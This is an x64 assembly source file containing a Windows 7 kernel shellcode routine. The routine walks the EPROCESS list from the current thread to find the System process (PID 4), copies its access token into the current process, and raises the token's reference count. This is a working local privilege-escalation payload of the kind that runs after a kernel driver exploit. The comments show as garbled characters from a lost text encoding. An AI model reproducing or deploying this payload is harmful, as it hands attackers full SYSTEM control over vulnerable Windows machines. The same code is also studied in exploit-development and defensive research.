.code

ShellCodeInWin7 proc
	push r8
	push r9
	; ��KPCR�л�ȡ��ǰ�߳�_ETHREAD
	mov rax, gs:[188h]
	; ��_ETHREAD�л�ȡ��ǰ����_EPROCESS
	mov rax, [rax + 70h]	
	mov r8, rax
	
find_system_proc:
	; ��ȡ��һ����EPROCESS��ַ
	mov rax, [rax + 188h]	
	sub rax, 188h
	; ��ȡPID
	mov rdx, [rax + 180h]	
	; �ж�pid�Ƿ�Ϊ4����Ϊ4����ת
	cmp rdx, 4			
	jne find_system_proc	

	; ��system��token��ֵ��������,���������ü���
	mov rax, [rax + 208h]	
	and al, 0f0h
	mov [r8 + 208h], rax
	mov r9, 2
	add [rax - 30h], r9
	
	; ���÷���ֵ���˳�����
	mov rax, 1
	pop r9
	pop r8
	ret 
ShellCodeInWin7 endp

end